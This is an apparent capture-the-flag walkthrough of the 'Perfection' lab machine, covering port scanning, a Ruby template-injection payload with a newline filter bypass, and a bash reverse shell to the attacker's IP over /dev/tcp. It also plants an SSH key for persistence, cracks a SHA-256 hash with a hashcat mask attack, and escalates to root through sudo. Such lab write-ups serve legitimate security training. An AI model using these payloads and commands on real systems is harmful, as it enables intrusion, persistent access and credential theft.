---
title: Perfection
published: true
layout: post
---

<br />

---------------
Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the sudo group. Further enumeration uncovers a database with password hashes, and the user's mail reveals a possible password format. Using a mask attack on the hash, the user's password is obtained, which is leveraged to gain root access. 

<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/VWSd_V7qtaY?si=rPgEI3iybf_bt-FQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------

<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.11.253 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.253 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```

![](/assets/Perfection/1.png)

<br />
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.253 -p 22,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```

![](/assets/Perfection/2.png)

<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.9p1**
+ **80/tcp nginx**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.253 -p 22,80 -T4 --min-rate 5000 --script="vuln or intrusive or discovery or *ssh* or *http* or *nginx*" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```

<br />

This scan didn't return any relevant information.

<br />

------

<br />
### Foothold

I actually found this machine a little bit hard, as I hadn't faced an **Server Side Template Injection (SSTI)** until this machine.

<br />

We can find a website that calculate a weighted grade based on an **input**, in the category textbox I tried to **inject commands**, and I received this output:<br />

![](/assets/Perfection/3.png)

<br />
<br />

I tried to **detect which characters are blocked** using BurpSuite, however none of the characters are useful for escaping to inject commands:<br />

![](/assets/Perfection/4.png)

<br />
<br />

I was stuck, so I searched in the Internet how this kind of filtering works, and I found that most of them work by **filtering only until the end of the line**, so I tried creating a **new line and using a blocked character**:

```bash
tanades%0a|whoami
```

![](/assets/Perfection/5.png)

<br />
<br />

I tried some **SSTI payloads** until I found one that worked, I also **URL encoded** them:

```bash
tanades%0a<%= 7*7 %>
```

![](/assets/Perfection/6.png)

<br />
<br />

Great!! Ruby interpreted it, let's try to **inject a command**:

```bash
tanades%0a<=% `ls /` %>
```

![](/assets/Perfection/7.png)

<br />
<br />

Great!! We can inject OS commands, so let's inject a reverse shell, but first remember to start listening:

```bash
nc -nlvp 4444
tanades%0a<=% `/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.5/4444 0>&1'` %>
```

![](/assets/Perfection/8.png)

<br />
<br />

Great!! We have a reverse shell in the machine, before anything, I pasted my **SSH public key in the authorized_keys** of this user to log in using SSH:

```bash
Kali> cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
Victim> mkdir /home/susan/.ssh
Victim> echo "public_key" >> /home/susan/.ssh/authorized_keys
```

<br />

Now we can log into the victim machine using SSH:

```bash
ssh susan@10.10.11.253
```

![](/assets/Perfection/9.png)

<br />
<br />

Let's print the flag and continue:<br />

![](/assets/Perfection/10.png)

<br />
<br />

------

<br />
### Privilege Escalation

<br />

Escalating privileges in this machine is quite entertaining, is something I haven't done before, but easier than SSTI.

<br />

We can find a few relevant pieces of information in this machine:

- A database with credentials in **/home/user/susan/Migration/pupilpath_credentials.db**.
- A mail in **/var/mail/susan**.
- We are part of the sudo group, however we need susan's password to use sudo.

Let's examine the database contents:

```bash
sqlite3 Migration/pupilpath_credentials.db
.tables
select * from users;
```

![](/assets/Perfection/11.png)

<br />
<br />

We have some hashes, which according to `hashid` is **SHA2-256**, let's continue with the email:

![](/assets/Perfection/12.png)

<br />
<br />

Okay, so we have a hash and a pattern for the password, let's use **hashcat in brute force** mode to crack it:

```bash
hashcat -a 3 -w 3 -m 1400 susan.hash susan_nasus_?d?d?d?d?d?d?d?d?d?d --increment
```

![](/assets/Perfection/13.png)

<br />
<br />

After a long time, we finally **cracked the password**, let's use it to elevate privileges and print the flag:

```bash
sudo su
cat /root/root.txt
```

![](/assets/Perfection/14.png)

<br />
<br />
